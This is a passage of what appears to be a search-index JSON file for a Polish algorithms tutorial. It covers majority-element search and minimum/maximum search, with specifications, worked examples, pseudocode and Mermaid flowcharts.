po\u0142ow\u0119 razy. Innymi s\u0142owy, je\u015bli w klubie by\u0142o \\(100\\) uczestnik\u00f3w, lider to taka ksi\u0105\u017cka, kt\u00f3ra zosta\u0142a wybrana przez co najmniej \\(51\\) os\u00f3b.</p> <p>Dlaczego jest to wa\u017cne? Znalezienie lidera w zbiorze mo\u017ce pom\u00f3c nam zrozumie\u0107 dominuj\u0105ce tendencje lub preferencje w danym \u015brodowisku. W kontek\u015bcie klubu ksi\u0105\u017cki, dowiedzenie si\u0119, kt\u00f3ra ksi\u0105\u017cka jest najbardziej popularna, mo\u017ce sugerowa\u0107, jakie tematy lub style literackie s\u0105 obecnie na czasie. W innych kontekstach, takich jak analiza danych czy badania rynku, identyfikacja lidera mo\u017ce dostarczy\u0107 cennych informacji o zachowaniach konsument\u00f3w, trendach czy dominuj\u0105cych opiniach.</p>"},{"location":"algorithms/searching/majority/#specyfikacja","title":"Specyfikacja","text":""},{"location":"algorithms/searching/majority/#dane","title":"Dane","text":"<ul> <li>\\(n\\) \u2014 liczba naturalna, liczebno\u015b\u0107 zbioru</li> <li>\\(A[1..n]\\) \u2014 \\(n-elementowy\\) zbi\u00f3r liczb ca\u0142kowitych, indeksowany od jedynki</li> </ul>"},{"location":"algorithms/searching/majority/#wynik","title":"Wynik","text":"<ul> <li>Lider podanego zbioru, lub -1, je\u017celi lider nie istnieje.</li> </ul> <p>Info</p> <p>Lider zbioru</p> <p>Liderem zbioru \\(n-elementowego\\) nazywamy element, kt\u00f3rego ilo\u015b\u0107 wyst\u0105pie\u0144 w zbiorze jest wi\u0119ksza ni\u017c \\(\\frac{n}{2}\\).</p> <p>Je\u017celi taki element nie istnieje, to zbi\u00f3r nie ma lidera.</p>"},{"location":"algorithms/searching/majority/#przykad-1","title":"Przyk\u0142ad 1","text":""},{"location":"algorithms/searching/majority/#dane_1","title":"Dane","text":"<pre><code>n := 10\nA := [4, 1, 4, 4, 2, 3, 4, 3, 4, 4]\n</code></pre> <p>Wynik: 4</p> <p>Info</p> <p>Wyja\u015bnienie</p> <p>Najcz\u0119\u015bciej wyst\u0119puj\u0105cym elementem w powy\u017cszym zbiorze jest warto\u015b\u0107 \\(4\\), kt\u00f3ra wyst\u0119puje dok\u0142adnie \\(6\\) razy, co jest warto\u015bci\u0105 wi\u0119ksz\u0105 od \\(n/2=10/2=5\\).</p>"},{"location":"algorithms/searching/majority/#przykad-2","title":"Przyk\u0142ad 2","text":""},{"location":"algorithms/searching/majority/#dane_2","title":"Dane","text":"<pre><code>n := 10\nA := [4, 1, 4, 4, 2, 3, 4, 3, 4, 1]\n</code></pre> <p>Wynik: \\(-1\\) (brak lidera)</p> <p>Info</p> <p>Wyja\u015bnienie</p> <p>Najcz\u0119\u015bciej wyst\u0119puj\u0105cym elementem w powy\u017cszym zbiorze jest warto\u015b\u0107 \\(4\\), kt\u00f3ra wyst\u0119puje dok\u0142adnie \\(5\\) razy, co nie jest warto\u015bci\u0105 wi\u0119ksz\u0105 od \\(n/2=10/2=5\\).</p>"},{"location":"algorithms/searching/majority/#rozwiazanie-naiwne","title":"Rozwi\u0105zanie naiwne","text":"<p>W celu stwierdzenia, \u017ce dany element jest liderem zbioru, potrzebujemy wiedzie\u0107, ile razy w zbiorze wyst\u0119puje. Gdyby\u015bmy wi\u0119c policzyli dla ka\u017cdego elementu zbioru jego liczebno\u015b\u0107 (liczb\u0119 wyst\u0105pie\u0144) w zbiorze, to byliby\u015bmy w stanie stwierdzi\u0107, czy zbi\u00f3r posiada lidera, a je\u015bli tak, to jaki element jest tym liderem. Przechodzimy wi\u0119c przez kolejne elementy zbioru i zliczamy ich wyst\u0105pienia. Oczywi\u015bcie w ten spos\u00f3b niekt\u00f3re elementy policzymy wielokrotnie, ale w\u0142a\u015bnie dlatego jest to naiwne rozwi\u0105zanie.</p>"},{"location":"algorithms/searching/majority/#pseudokod","title":"Pseudokod","text":"<pre><code>funkcja SzukajLidera(n, A):\n    1. Od i := 1 do n, wykonuj:\n        2. ile := 0\n        3. Od j := 1 do n, wykonuj:\n            4. Je\u017celi A[i] = A[j], to:\n                5. ile := ile + 1\n        6. Je\u017celi ile &gt; n/2, to:\n            7. Zwr\u00f3c A[i], zako\u0144cz\n    8. Zwr\u00f3c -1\n</code></pre> <p>Funkcja SzukajLidera - ta funkcja pr\u00f3buje znale\u017a\u0107 lidera w li\u015bcie (<code>A</code>).</p> <ul> <li>Dla ka\u017cdego elementu listy (<code>A</code>):</li> <li>Zerujemy licznik <code>ile</code>.</li> <li>Nast\u0119pnie dla ka\u017cdego innego elementu w tej samej li\u015bcie:<ul> <li>Je\u015bli dany element jest taki sam jak nasz wybrany element, dodajemy \\(1\\) do licznika.</li> </ul> </li> <li>Po przejrzeniu wszystkich innych element\u00f3w sprawdzamy licznik:<ul> <li>Je\u015bli nasz wybrany element pojawia si\u0119 wi\u0119cej ni\u017c po\u0142ow\u0119 razy w li\u015bcie (czyli licznik <code>ile</code> jest wi\u0119kszy ni\u017c <code>n/2</code>), to znaczy, \u017ce znale\u017ali\u015bmy lidera i zwracamy go.</li> </ul> </li> <li>Je\u015bli przeszli\u015bmy przez ca\u0142\u0105 list\u0119 i nie znale\u017ali\u015bmy lidera, zwracamy \\(-1\\), co oznacza, \u017ce nie ma lidera w li\u015bcie.</li> </ul> <p>W skr\u00f3cie, ten pseudokod sprawdza ka\u017cdy element listy, czy jest liderem, licz\u0105c ile razy pojawia si\u0119 w ca\u0142ej li\u015bcie. Je\u015bli kt\u00f3rykolwiek element pojawia si\u0119 wi\u0119cej ni\u017c po\u0142ow\u0119 razy, jest liderem. Je\u015bli \u017caden element nie spe\u0142nia tego kryterium, nie ma lidera.</p>"},{"location":"algorithms/searching/majority/#schemat-blokowy","title":"Schemat blokowy","text":"<pre><code>%%{init: {\"flowchart\": {\"curve\": \"linear\"}, \"theme\": \"neutral\"} }%%\nflowchart TD\n    START([\"SzukajLidera(n, A)\"]) --&gt; K0[i := 1]\n    K0 --&gt; K1{i &lt;= n}\n    K1 -- PRAWDA --&gt; K2[\"ile := 0\n    j := 1\"]\n    K2 --&gt; K3{j &lt;= n}\n    K3 -- PRAWDA --&gt; K4{\"A[i] = A[j]\"}\n    K4 -- PRAWDA --&gt; K5[ile := ile + 1]\n    K4 -- FA\u0141SZ --&gt; K3i[j := j + 1]\n    K5 --&gt; K3i\n    K3i --&gt; K3\n    K3 -- FA\u0141SZ --&gt; K6{ile &gt; n / 2}\n    K6 -- PRAWDA --&gt; K7[/\"Zwr\u00f3c A[i]\"/]\n    K7 --&gt; STOP([STOP])\n    K6 -- FA\u0141SZ ---&gt; K1i[i := i + 1]\n    K1i --&gt; K1\n    K1 -- FA\u0141SZ --&gt; K8[/Zwr\u00f3c -1/]\n    K8 --&gt; STOP</code></pre>"},{"location":"algorithms/searching/majority/#zozonosc","title":"Z\u0142o\u017cono\u015b\u0107","text":"<p>\\(O(n^2)\\) \u2014 kwadratowa</p>"},{"location":"algorithms/searching/majority/#rozwiazanie-optymalne","title":"Rozwi\u0105zanie optymalne","text":"<p>W rozwi\u0105zaniu optymalnym nale\u017cy zacz\u0105\u0107 od pewnego spostrze\u017cenia. Je\u017celi we\u017amiemy jaki\u015b zbi\u00f3r i usuniemy z niego dwa r\u00f3\u017cne elementy, to powsta\u0142y w ten spos\u00f3b zbi\u00f3r b\u0119dzie mia\u0142 takiego samego lidera. Dzi\u0119ki tej obserwacji mo\u017cemy \"skre\u015bla\u0107\" parami r\u00f3\u017cne elementy, a\u017c nie zostanie nam nic do skre\u015blenia. Oczywi\u015bcie nie b\u0119dziemy fizycznie wykre\u015bla\u0107 element\u00f3w z tablicy. To \"skre\u015blanie\" zrealizujemy za pomoc\u0105 odpowiedniego zliczania i zapami\u0119tywania tzw. kandydata na lidera. Zaczniemy od przyj\u0119cia pierwszego elementu z tablicy jako kandydata na lidera. Zliczymy tak\u017ce jego liczb\u0119 dotychczasowych \"nieskre\u015blonych\" powt\u00f3rze\u0144. Nast\u0119pnie przejdziemy przez kolejne warto\u015bci z tablicy. Je\u017celi w kt\u00f3rym\u015b momencie nasz licznik si\u0119 wyzeruje, to przyjmiemy obecny element jako nowego kandydata i licznik ustawimy na jeden. Je\u017celi natomiast licznik b\u0119dzie wi\u0119kszy od zera, nale\u017cy por\u00f3wna\u0107 kandydata z obecnym elementem z tablicy. Je\u017celi napotkamy warto\u015b\u0107 r\u00f3wn\u0105 kandydatowi, to zwi\u0119kszamy licznik wyst\u0105pie\u0144 kandydata. Je\u017celi natomiast napotkamy warto\u015b\u0107 r\u00f3\u017cn\u0105 od kandydata, to b\u0119dziemy symulowa\u0107 \"skre\u015blanie\" poprzez zmniejszenie licznika wyst\u0105pie\u0144 obecnego kandydata o jeden.</p> <p>Gdy ju\u017c przejdziemy przez wszystkie elementy tablicy to na koniec zostaniemy z jakim\u015b kandydatem na lidera. Je\u017celi zbi\u00f3r ma lidera, to b\u0119dzie nim ten kandydat. Mo\u017ce by\u0107 jednak tak, \u017ce zbi\u00f3r nie ma lidera. Dlatego pozostaje nam zliczy\u0107 liczb\u0119 wyst\u0105pie\u0144 naszego kandydata w zbiorze, co realizujemy przechodz\u0105c element po elemencie. Na koniec sprawdzamy, czy liczba wyst\u0105pie\u0144 kandydata jest wi\u0119ksza od po\u0142owy liczebno\u015bci zbioru.</p>"},{"location":"algorithms/searching/majority/#pseudokod_1","title":"Pseudokod","text":"<pre><code>funkcja Zlicz(n, A, el):\n    1. ile := 0\n    2. Od i := 1 do n, wykonuj:\n        3. Je\u017celi A[i] = el, to:\n            4. ile := ile + 1\n    5. Zwr\u00f3\u0107 ile\n\nfunkcja SzukajLidera(n, A)\n    1. lider := A[1]\n    2. ile := 1\n    3. Od i := 2 do n, wykonuj:\n        4. Je\u017celi ile = 0, to:\n            5. lider := A[i]\n            6. ile := 1\n\n        7. w przeciwnym przypadku, je\u017celi lider = A[i]:\n            8. ile := ile + 1\n\n        9. w przeciwnym przypadku:\n            10. ile := ile - 1\n\n    11. Je\u017celi Zlicz(n, A, lider) &gt; n/2, to:\n        12. Zwr\u00f3\u0107 lider, zako\u0144cz\n\n    13. w przeciwnym przypadku:\n        14. Zwr\u00f3\u0107 -1, zako\u0144cz\n</code></pre> <p>Funkcja Zlicz - ta funkcja liczy, ile razy dany element (<code>el</code>) pojawia si\u0119 w li\u015bcie (<code>A</code>).</p> <ul> <li>Zaczynamy z licznikiem <code>ile</code> na \\(0\\).</li> <li>Przechodzimy przez ka\u017cdy element listy (<code>A</code>).</li> <li>Je\u015bli element listy jest taki sam jak szukany element (<code>el</code>), dodajemy \\(1\\) do licznika.</li> <li>Na ko\u0144cu zwracamy warto\u015b\u0107 licznika.</li> </ul> <p>Funkcja SzukajLidera - ta funkcja szuka lidera w li\u015bcie (<code>A</code>).</p> <ul> <li>Zak\u0142adamy na pocz\u0105tek, \u017ce pierwszy element listy to lider.</li> <li>Ustawiamy licznik <code>ile</code> na \\(1\\).</li> <li>Przechodzimy przez reszt\u0119 listy:</li> <li>Je\u015bli licznik <code>ile</code> wynosi \\(0\\), aktualny element staje si\u0119 nowym liderem, a licznik jest resetowany do \\(1\\).</li> <li>Je\u015bli aktualny element jest taki sam jak nasz obecny lider, dodajemy \\(1\\) do licznika.</li> <li>W przeciwnym razie odejmujemy \\(1\\) od licznika.</li> <li>Po przej\u015bciu przez ca\u0142\u0105 list\u0119 sprawdzamy, czy nasz lider wyst\u0119puje wi\u0119cej ni\u017c po\u0142ow\u0119 razy w li\u015bcie. U\u017cywamy do tego funkcji Zlicz.</li> <li>Je\u015bli tak, zwracamy go jako lidera.</li> <li>W przeciwnym razie zwracamy \\(-1\\), co oznacza, \u017ce nie ma lidera.</li> </ul>"},{"location":"algorithms/searching/majority/#schemat-blokowy_1","title":"Schemat blokowy","text":"<pre><code>%%{init: {\"flowchart\": {\"curve\": \"linear\"}, \"theme\": \"neutral\"} }%%\nflowchart TD\n    START([\"Zlicz(n, A, el)\"]) --&gt; K1[\"ile := 0\n    i := 1\"]\n    K1 --&gt; K2{i &lt;= n}\n    K2 --PRAWDA --&gt; K3{\"el = A[i]\"}\n    K3 --PRAWDA --&gt; K4[\"ile := ile + 1\"]\n    K3 --FA\u0141SZ --&gt; K5[\"i := i + 1\"]\n    K4 --&gt; K5\n    K5 --&gt; K2\n    K2 --FA\u0141SZ --&gt; K6[/\"Zwr\u00f3\u0107 ile\"/]\n    K6 ---&gt; STOP([STOP])</code></pre> <pre><code>%%{init: {\"flowchart\": {\"curve\": \"linear\"}, \"theme\": \"neutral\"} }%%\nflowchart TD\n    START([\"SzukajLidera(n, A)\"]) --&gt; K1[\"lider := A[1]\n    ile := 1\n    i := 1\"]\n    K1 --&gt; K3{i &lt;= n}\n    K3 -- PRAWDA --&gt; K4{ile = 0}\n    K4 -- PRAWDA --&gt; K5[\"lider := A[i]\"]\n    K5 --&gt; K6[ile := 1]\n    K4 -- FA\u0141SZ --&gt; K7{\"lider = A[i]\"}\n    K7 -- PRAWDA --&gt; K8[ile := ile + 1]\n    K7 -- FA\u0141SZ --&gt; K10[ile := ile - 1]\n    K10 --&gt; K3i[i := i + 1]\n    K8 --&gt; K3i\n    K6 --&gt; K3i\n    K3i --&gt; K3\n    K3 -- FA\u0141SZ ---&gt; K15{\"Zlicz(n, A, lider) &gt; n / 2\"}\n    K15 -- PRAWDA --&gt; K16[/Zwr\u00f3\u0107 lider/]\n    K16 --&gt; STOP([STOP])\n    K15 -- FA\u0141SZ --&gt; K18[/Zwr\u00f3\u0107 - 1/]\n    K18 --&gt; STOP</code></pre>"},{"location":"algorithms/searching/majority/#zozonosc_1","title":"Z\u0142o\u017cono\u015b\u0107","text":"<p>\\(O(n)\\) \u2014 liniowa</p>"},{"location":"algorithms/searching/majority/#implementacja","title":"Implementacja","text":""},{"location":"algorithms/searching/majority/#c","title":"C++","text":""},{"location":"algorithms/searching/majority/#python","title":"Python","text":""},{"location":"algorithms/searching/majority/#kotlin","title":"Kotlin","text":""},{"location":"algorithms/searching/majority/#implementacje-pozostae","title":"Implementacje \u2014 pozosta\u0142e","text":""},{"location":"algorithms/searching/majority/#_1","title":"Znajdowanie lidera w zbiorze","text":""},{"location":"algorithms/searching/majority/#julia","title":"Julia","text":""},{"location":"algorithms/searching/majority/#powiazane-zagadnienia","title":"Powi\u0105zane zagadnienia","text":"<ul> <li>Znajdowanie lidera w posortowanej tablicy.</li> <li>Znajdowanie lidera w dwuwymiarowej tablicy, gdzie ka\u017cdy wiersz jest posortowany.</li> <li>Znajdowanie wszystkich element\u00f3w, kt\u00f3re wyst\u0119puj\u0105 w tablicy wi\u0119cej ni\u017c \\(n/k\\) razy, gdzie \\(n\\) to rozmiar tablicy, a \\(k\\) to zadana liczba naturalna, \\(n\\geq k&gt;0\\).</li> </ul>"},{"location":"algorithms/searching/min-max-search/","title":"Jednoczesne wyszukiwanie minimum i maksimum","text":"<p>Zdarza si\u0119 i tak, \u017ce potrzebujemy znale\u017a\u0107 warto\u015b\u0107 minimaln\u0105 i maksymaln\u0105 jednocze\u015bnie, najlepiej za jednym razem. Mo\u017cemy oczywi\u015bcie osobno wyszuka\u0107 minimum i maksimum korzystaj\u0105c ze standardowego algorytmu. By\u0107 mo\u017ce jednak da si\u0119 to zrobi\u0107 lepiej, wydajniej? Na to pytanie postaramy si\u0119 odpowiedzie\u0107. Zacznijmy od formalnej specyfikacji.</p>"},{"location":"algorithms/searching/min-max-search/#specyfikacja","title":"Specyfikacja","text":""},{"location":"algorithms/searching/min-max-search/#dane","title":"Dane","text":"<ul> <li>\\(n\\) \u2014 liczba naturalna, liczba element\u00f3w w tablicy</li> <li>\\(A[1..n]\\) \u2014 tablica \\(n\\) warto\u015bci ca\u0142kowitych</li> </ul>"},{"location":"algorithms/searching/min-max-search/#wynik","title":"Wynik","text":"<ul> <li>Najwi\u0119ksza oraz najmniejsza warto\u015b\u0107 z tablicy \\(A\\)</li> </ul>"},{"location":"algorithms/searching/min-max-search/#przykad","title":"Przyk\u0142ad","text":""},{"location":"algorithms/searching/min-max-search/#dane_1","title":"Dane","text":"<pre><code>n := 5\nA := [6, 3, 1, 9, 2]\n</code></pre>"},{"location":"algorithms/searching/min-max-search/#wynik_1","title":"Wynik","text":"<pre><code>minimum := 1\nmaksimum := 9\n</code></pre>"},{"location":"algorithms/searching/min-max-search/#rozwiazanie-naiwne","title":"Rozwi\u0105zanie naiwne","text":"<p>Zacznijmy od rozwi\u0105zania naiwnego. Pomys\u0142 jest nast\u0119puj\u0105cy: zastosujmy standardowy algorytm do znajdowania minimum i maksimum. Na pocz\u0105tku jako tymczasowe minimum i maksimum przyjmiemy warto\u015b\u0107 pierwszego elementu z tablicy. Nast\u0119pnie przejdziemy p\u0119tl\u0105 przez kolejne elementy. Ka\u017cdy element b\u0119dziemy por\u00f3wnywa\u0107 z dotychczasowymi warto\u015bciami minimum i maksimum, dokonuj\u0105c odpowiednich zamian w razie potrzeby.</p>"},{"location":"algorithms/searching/min-max-search/#pseudokod","title":"Pseudokod","text":"<pre><code>funckja SzukajMinMax(n, A):\n    1. min := A[1]\n    2. max := A[1]\n    3. Od i := 2 do n, wykonuj:\n        4. Je\u017celi min &gt; A[i], to:\n            5. min := A[i]\n        6. Je\u017celi max &lt; A[i], to:\n            7. max := A[i]\n    8. Zwr\u00f3\u0107 min, max\n</code></pre>"},{"location":"algorithms/searching/min-max-search/#schemat-blokowy","title":"Schemat blokowy","text":"<pre><code>%%{init: {\"flowchart\": {\"curve\": \"linear\"}, \"theme\": \"neutral\"} }%%\nflowchart TD\n    START([\"SzukajMinMax(n, A)\"]) --&gt; K1[\"min := A[1]\n    max := A[1]\n    i := 1\"]\n    K1 --&gt; K3{i &lt;= n}\n    K3 -- PRAWDA --&gt; K4{\"min &gt; A[i]\"}\n    K4 -- PRAWDA --&gt; K5[\"min := A[i]\"]\n    K5 --&gt; K6{\"max &lt; A[i]\"}\n    K4 -- FA\u0141SZ --&gt; K6\n    K6 -- PRAWDA --&gt; K7[\"max := A[i]\"]\n    K7 --&gt; K3i[i := i + 1]\n    K6 -- FA\u0141SZ --&gt; K3i\n    K3i --&gt; K3\n    K3 -- FA\u0141SZ ---&gt; K8[/Zwr\u00f3\u0107 min, max/]\n    K8 ----&gt; STOP([STOP])</code></pre>"},{"location":"algorithms/searching/min-max-search/#zozonosc","title":"Z\u0142o\u017cono\u015b\u0107","text":"<p>\\(O(2n)\\)</p> <p>Mamy jedn\u0105 p\u0119tl\u0119, ale dwa por\u00f3wnania wewn\u0105trz niej. W takim razie dla ka\u017cdego przebiegu p\u0119tli wykonujemy dwa por\u00f3wnania, \u0142\u0105cznie wykonujemy ich wi\u0119c w przybli\u017ceniu \\(2n\\), co w praktyce daje nam z\u0142o\u017cono\u015b\u0107 liniow\u0105.</p>"},{"location":"algorithms/searching/min-max-search/#rozwiazanie-optymalne","title":"Rozwi\u0105zanie optymalne","text":"<p>Podejd\u017amy do problemu od innej strony. Zastan\u00f3wmy si\u0119, jak mo\u017cemy przygotowa\u0107 sobie dane, aby u\u0142atwi\u0107 sobie prac\u0119? Mamy pewien zestaw liczb, w\u015br\u00f3d kt\u00f3rych chcemy znale\u017a\u0107 zar\u00f3wno minimum jak i maksimum. W takim razie podzielmy wst\u0119pnie nasze liczby na kandydat\u00f3w minimum oraz kandydat\u00f3w maksimum. Zrobimy to przechodz\u0105c po kolei po parach s\u0105siednich liczb z tablicy i por\u00f3wnuj\u0105c je ze sob\u0105. Mniejsz\u0105 z warto\u015bci z pary wrzucimy do kandydat\u00f3w na minimum, a wi\u0119ksz\u0105 umie\u015bcimy w kandydatach na maksimum. W ten spos\u00f3b uzyskamy dwie tablice, z kt\u00f3rych ka\u017cda b\u0119dzie mia\u0142a d\u0142ugo\u015b\u0107 r\u00f3wn\u0105 po\u0142owie d\u0142ugo\u015bci pierwotnej tablicy. Teraz mo\u017cemy przej\u015b\u0107 do wyszukiwania minimum i maksimum. Minimum b\u0119dziemy szuka\u0107 standardowym algorytmem w tablicy kandydat\u00f3w na minimum. Podobnie zrobimy z maksimum, szukaj\u0105c go w kandydatach na maksimum.</p> <p>Warning</p> <p>Uwaga</p> <p>Dla u\u0142atwienia zak\u0142adamy, \u017ce d\u0142ugo\u015b\u0107 tablicy (warto\u015b\u0107 \\(n\\)) jest liczb\u0105 parzyst\u0105. Je\u017celi tak nie jest, mo\u017cemy np. powieli\u0107 ostatni element tablicy, albo rozwa\u017cy\u0107 ten szczeg\u00f3lny przypadek w algorytmie.</p>"},{"location":"algorithms/searching/min-max-search/#pseudokod_1","title":"Pseudokod","text":"<pre><code>funkcja SzukajMinMax(n, A):\n    1. kandMin := []\n    2. kandMax := []\n    3. i := 1\n    4. k := 1\n    5. Dop\u00f3ki i + 1 &lt;= n, wykonuj:\n        6. Je\u017celi A[i] &lt; A[i+1], to:\n            7. kandMin[k] := A[i]\n            8. kandMax[k] := A[i+1]\n        9. w przeciwnym przypadku:\n            10. kandMin[k] := A[i+1]\n            11. kandMax[k] := A[i]\n        12. k := k + 1\n        13. i := i + 2\n    14. min := kandMin[1]\n    15. max := kandMax[1]\n    16. Od i := 2 do (n div 2), wykonuj:\n        17. Je\u017celi min &gt; kandMin[i], to:\n            18. min := kandMin[i]\n        19. Je\u017celi max &lt; kandMax[i], to:\n            20. max := kandMax[i]\n    21. Zwr\u00f3c min, max\n</code></pre>"},{"location":"algorithms/searching/min-max-search/#schemat-blokowy_1","title":"Schemat blokowy","text":"<pre><code>%%{init: {\"flowchart\": {\"curve\": \"linear\"}, \"theme\": \"neutral\"} }%%\nflowchart TD\n    START([\"SzukajMinMax(n, A)\"]) --&gt; K1[\"kandMin := [1 .. n div 2]\n    kandMax := [1 .. n div 2]\n    i := 1\n    k := 1\"]\n    K1 --&gt; K5{i + 1 &lt;= n}\n    K5 -- PRAWDA --&gt; K6{\"A[i] &lt; A[i + 1]\"}\n    K6 -- PRAWDA --&gt; K7[\"kandMin[k] := A[i]\"]\n    K7 --&gt; K8[\"kandMax[k] := A[i + 1]\"]\n    K6 -- FA\u0141SZ --&gt; K10[\"kandMin[k] := A[i + 1]\"]\n    K10 --&gt; K11[\"kandMax[k] := A[i]\"]\n    K8 --&gt; K12[\"k := k + 1\n    i := i + 2\"]\n    K11 --&gt; K12\n    K12 --&gt; K5\n    K5 -- FA\u0141SZ --&gt; K14[\"min := kandMin[1]\n    max := kandMax[1]\n    i := 1\"]\n    K14 --&gt; K16{i &lt;= n div 2}\n    K16 -- PRAWDA --&gt; K17{\"min &gt; kandMin[i]\"}\n    K17 -- PRAWDA --&gt; K18[\"min := kandMin[i]\"]\n    K17 -- FA\u0141SZ --&gt; K19{\"max &lt; kandMax[i]\"}\n    K18 --&gt; K19\n    K19 -- PRAWDA --&gt; K20[\"max := kandMax[i]\"]\n    K19 -- FA\u0141SZ --&gt; K16i[i := i + 1]\n    K20 --&gt; K16i\n    K16i --&gt; K16\n    K16 -- FA\u0141SZ ---&gt; K21[\\\"Zwr\u00f3c min, max\"\\]\n    K21 ----&gt; STOP([STOP])</code></pre>"},{"location":"algorithms/searching/min-max-search/#zozonosc_1","title":"Z\u0142o\u017cono\u015b\u0107","text":"<p>\\(O(3\\frac{n}{2})\\) </p> <p>Najpierw dokonujemy podzia\u0142u na dwie tablice pomocnicze wykonuj\u0105c \\(\\frac{n}{2}\\) operacji. Nast\u0119pnie wyszukujemy minimum i maksimum w odpowiednich tablicach. Ka\u017cda z nich ma d\u0142ugo\u015b\u0107 \\(\\frac{n}{2}\\), wi\u0119c \u0142\u0105cznie na znalezienie minimum i maksimum potrzebujemy wykona\u0107 \\(2\\frac{n}{2}=n\\) por\u00f3wna\u0144. Wszystko razem daje nam \\(3\\frac{n}{2}\\) por\u00f3wna\u0144. W praktyce wci\u0105\u017c mamy z\u0142o\u017cono\u015b\u0107 liniow\u0105, wykonujemy jednak mniej operacji ni\u017c przy algorytmie naiwnym.</p>"},{"location":"algorithms/searching/min-max-search/#implementacja","title":"Implementacja","text":""},{"location":"algorithms/searching/min-max-search/#c","title":"C++","text":""},{"location":"algorithms/searching/min-max-search/#python","title":"Python","text":""},{"location":"algorithms/searching/min-max-search/#kotlin","title":"Kotlin","text":""},{"location":"algorithms/searching/min-max-search/#implementacje-pozostae","title":"Implementacje \u2014 pozosta\u0142e","text":""},{"location":"algorithms/searching/min-max-search/#_1","title":"Jednoczesne wyszukiwanie minimum i maksimum","text":""},{"location":"algorithms/searching/min-max-search/#julia","title":"Julia","text":""},{"location":"algorithms/searching/min-or-max/","title":"Wyszukiwanie minimum i maksimum","text":"<p>Wyobra\u017amy sobie, \u017ce odwiedzamy pewien sklep internetowy, np. w poszukiwaniu nowego laptopa. Na pocz\u0105tek chcemy sprawdzi\u0107, jaki jest najdro\u017cszy z dost\u0119pnych sprz\u0119t\u00f3w. Co mo\u017cemy w tym celu zrobi\u0107? Mo\u017cemy oczywi\u015bcie posortowa\u0107 produkty po cenie. Nie potrzebna nam jednak lista wszystkich produkt\u00f3w, a tylko jeden - ten najdro\u017cszy.</p> <p>W tym temacie zajmiemy si\u0119 w\u0142a\u015bnie takim problemem - znajdowaniem elementu maksymalnego (albo minimalnego) w zadanym zbiorze.</p>"},{"location":"algorithms/searching/min-or-max/#wyszukiwanie-wartosci-maksymalnej-w-tablicy","title":"Wyszukiwanie warto\u015bci maksymalnej w tablicy","text":"<p>Zacznijmy od standardowej wersji problemu. Jak to zwykle w informatyce, b\u0119dziemy rozwa\u017ca\u0107 pewien uporz\u0105dkowany zbi\u00f3r element\u00f3w, a dok\u0142adnie tablic\u0119 liczb ca\u0142kowitych. Oczywi\u015bcie w og\u00f3lno\u015bci nie ma znaczenia, jakie to b\u0119d\u0105 warto\u015bci, pod warunkiem, \u017ce mo\u017cemy je ze sob\u0105 por\u00f3wnywa\u0107 i mo\u017cna w\u015br\u00f3d nich znale\u017a\u0107 warto\u015b\u0107 najwi\u0119ksz\u0105.</p> <p>Interesuje nas znalezienie warto\u015bci maksymalnej w zadanej tablicy. Jak zwykle, zaczynamy od bardziej formalnej specyfikacji naszego problemu.</p>"},{"location":"algorithms/searching/min-or-max/#specyfikacja","title":"Specyfikacja","text":""},{"location":"algorithms/searching/min-or-max/#dane","title":"Dane","text":"<ul> <li>\\(n\\) - liczba naturalna, liczba element\u00f3w w tablicy</li> <li>\\(A[1..n]\\) - tablica \\(n\\) warto\u015bci ca\u0142kowitych</li> </ul>"},{"location":"algorithms/searching/min-or-max/#wynik","title":"Wynik","text":"<ul> <li>Najwi\u0119ksza warto\u015b\u0107 z tablicy \\(A\\)</li> </ul>"},{"location":"algorithms/searching/min-or-max/#przykad","title":"Przyk\u0142ad","text":""},{"location":"algorithms/searching/min-or-max/#dane_1","title":"Dane","text":"<pre><code>n := 8\nA := [6, 5, 3, 1, 8, 7, 2, 4]\n</code></pre> <p>Wynik: \\(8\\)</p>"},{"location":"algorithms/searching/min-or-max/#animacja","title":"Animacja","text":"<p>Wyszukiwanie maksimum</p>"},{"location":"algorithms/searching/min-or-max/#rozwiazanie","title":"Rozwi\u0105zanie","text":"<p>Zanim przejdziemy do rozwi\u0105zywania problemu warto przyjrze\u0107 si\u0119 dok\u0142adnie powy\u017cszej animacji. Pokazuje ona, krok po kroku, metod\u0119, kt\u00f3r\u0105 zastosujemy.</p> <p>Idea jest prosta: na pocz\u0105tku przygl\u0105damy si\u0119 pierwszemu elementowi z tablicy i stwierdzamy \"tak, to mo\u017ce by\u0107 nasz element maksymalny\", wi\u0119c zapami\u0119tujemy jego warto\u015b\u0107. Innymi s\u0142owy: warto\u015b\u0107 pierwszego elementu tablicy zapami\u0119tujemy jako dotychczasowe maksimum.</p> <p>Teraz mo\u017cemy przej\u015b\u0107 do sprawdzania kolejnych element\u00f3w tablicy, kt\u00f3re b\u0119dziemy przegl\u0105da\u0107 jeden po drugim, czyli liniowo, podobnie jak w algorytmie wyszukiwania liniowego. Ka\u017cdy kolejny element tablicy b\u0119dziemy por\u00f3wnywa\u0107 z naszym dotychczasowym maksimum. Je\u017celi znajdziemy element o warto\u015bci wi\u0119kszej ni\u017c nasze dotychczasowe maksimum, to znaczy, \u017ce w\u0142a\u015bnie t\u0119 wi\u0119ksz\u0105 warto\u015b\u0107 nale\u017cy zapami\u0119ta\u0107 jako nasze dotychczasowe maksimum. Poprzedni\u0105 warto\u015b\u0107 mo\u017cemy zapomnie\u0107, jako \u017ce interesuje nas tylko jedna warto\u015b\u0107: maksymalna.</p> <p>Na ko\u0144cu, gdy ju\u017c sprawdzimy wszystkie elementy tablicy, nasze dotychczasowe maksimum b\u0119dzie ju\u017c maksimum z ca\u0142ej tablicy i t\u0119 w\u0142a\u015bnie warto\u015b\u0107 zwr\u00f3cimy jako wynik naszego algorytmu.</p> <p>Zapiszmy teraz nasz algorytm w postaci pseudokodu.</p>"},{"location":"algorithms/searching/min-or-max/#pseudokod","title":"Pseudokod","text":"<pre><code>funkcja SzukajMaks(n, A):\n    1. max := A[1]\n    2. Od i := 2 do n, wykonuj:\n        3. Je\u017celi max &lt; A[i], to:\n            4. max := A[i]\n\n    5. Zwr\u00f3\u0107 maks\n</code></pre>"},{"location":"algorithms/searching/min-or-max/#schemat-blokowy","title":"Schemat blokowy","text":"<pre><code>%%{init: {\"flowchart\": {\"curve\": \"linear\"}, \"theme\": \"neutral\"} }%%\nflowchart TD\n    START([\"FindMax(n, A)\"]) --&gt; K1[\"max := A[1]\n    i := 1\"]\n    K1 --&gt; K2{i &lt;= n}\n    K2 -- PRAWDA --&gt; K3{\"max &lt; A[i]\"}\n    K3 -- PRAWDA --&gt; K4[\"max := A[i]\"]\n    K4 --&gt; K2i[i := i + 1]\n    K2i --&gt; K2\n    K3 -- 